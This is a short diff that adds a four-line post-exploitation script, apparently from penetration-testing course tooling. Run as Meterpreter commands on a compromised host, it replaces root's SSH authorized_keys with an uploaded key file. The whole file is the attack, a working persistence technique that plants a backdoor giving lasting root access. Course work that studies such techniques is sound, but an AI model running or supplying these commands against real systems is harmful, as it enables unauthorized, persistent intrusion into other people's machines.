@@ -1,0 +1,4 @@
+execute -f 'mkdir' -a '-p /root/.ssh/'
+execute -f 'mv' -a '/root/.ssh/authorized_keys /root/.ssh/authorized_keys.old'
+upload /home/tijmen/pen300/tools/msfconsole/authorized_keys /root/.ssh/authorized_keys
+execute -f 'chmod' -a '600 /root/.ssh/authorized_keys'
